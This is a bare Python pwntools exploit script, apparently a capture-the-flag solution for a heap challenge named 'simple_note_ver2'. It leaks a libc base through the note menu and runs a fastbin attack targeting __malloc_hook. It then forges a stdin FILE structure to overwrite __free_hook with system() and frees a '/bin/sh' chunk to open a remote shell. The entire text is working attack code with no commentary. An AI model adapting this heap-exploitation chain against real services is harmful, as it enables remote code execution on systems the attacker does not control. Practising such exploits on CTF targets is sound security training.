#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('simple_note_ver2'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(size, note, no_size=False):
    r.sendlineafter('choice:\n', '1')
    r.sendlineafter('note.\n', str(size))
    r.recvuntil('note.\n')
    if no_size:
        r.sendline(note)
    else:
        r.send(note, size)

def show(idx):
    r.sendlineafter('choice:\n', '2')
    r.sendlineafter('note.\n', str(idx))

def delete(idx):
    r.sendlineafter('choice:\n', '3')
    r.sendlineafter('note.\n', str(idx))

r = remote(HOST, PORT)

# leak base
add(0x100, ' ')
add(0x10, ' ')
delete(0)
add(0x100, ' ')
show(0)
libc_base = r.leak('Content:') - 0x3c4b20
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

# fastbin attack
malloc_hook = libc_base + 0x3c48cd
fake = flat(0, 0x70, malloc_hook)

add(0x60, ' ')
delete(2)
delete(1)
add(0, 'a'*0x10 + fake, no_size=True)
add(0x60, '/bin/sh')
fake_buf_base = libc.sym['__free_hook'] - 8
fake_buf_end = fake_buf_base + 0x20
fake_stdin = flat(0xfbad208b, [fake_buf_base]*7, fake_buf_end)
add(0x60, '\x00'*3 + fake_stdin)

r.sendafter('choice:\n', '\x00'*8 + p64(libc.sym['system']))
delete(2)

r.interactive()
